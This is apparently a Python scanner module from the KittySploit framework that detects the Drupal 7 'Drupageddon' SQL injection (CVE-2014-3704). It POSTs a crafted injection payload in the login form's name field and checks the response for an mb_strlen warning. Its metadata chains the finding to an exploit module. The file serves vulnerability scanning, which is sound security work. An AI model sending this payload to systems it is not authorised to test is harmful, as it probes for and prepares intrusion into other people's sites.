#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Drupal 7.x SA-CORE-2014-005 SQLi detection (CVE-2014-3704)."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Drupal - SA-CORE-2014-005 SQLi Detection (CVE-2014-3704)',
        'description': (
            'Detects Drupageddon CVE-2014-3704 by POSTing crafted name[0; SELECT ...] '
            'to the login form and matching mb_strlen warning.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2014', 'drupal', 'sqli', 'unauth', 'kev', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'sqli', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['exploits/multi/http/drupal_cve_2014_3704_sqli'],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2014-3704',
            'https://www.drupal.org/SA-CORE-2014-005',
        ],
        'cve': 'CVE-2014-3704',
    }

    def run(self):
        tag = self.random_text(8)
        data = (
            f'name[0;%20SELECT+{tag};#]=0&name[0]=={tag}&pass={tag}'
            f'&test2=test&form_build_id=&form_id=user_login_block&op=Log+in'
        )
        for base in ('', '/drupal', '/cms'):
            path = f'{base}/?q=node&destination=node'
            r = self.http_request(
                method='POST',
                path=path,
                data=data,
                headers={'Content-Type': 'application/x-www-form-urlencoded'},
                allow_redirects=False,
            )
            if not r:
                continue
            body = r.text or ''
            if 'mb_strlen() expects parameter 1' in body and 'unexpected error' not in body.lower():
                self.set_info(
                    severity='critical',
                    reason='Drupal Drupageddon SQLi (CVE-2014-3704)',
                    path=f'{base}/',
                )
                return True
            # also match warning.*mb_strlen loosely
            if 'warning' in body.lower() and 'mb_strlen' in body and 'unexpected error' not in body.lower():
                self.set_info(
                    severity='critical',
                    reason='Drupal Drupageddon SQLi (CVE-2014-3704)',
                    path=f'{base}/',
                )
                return True
        return False
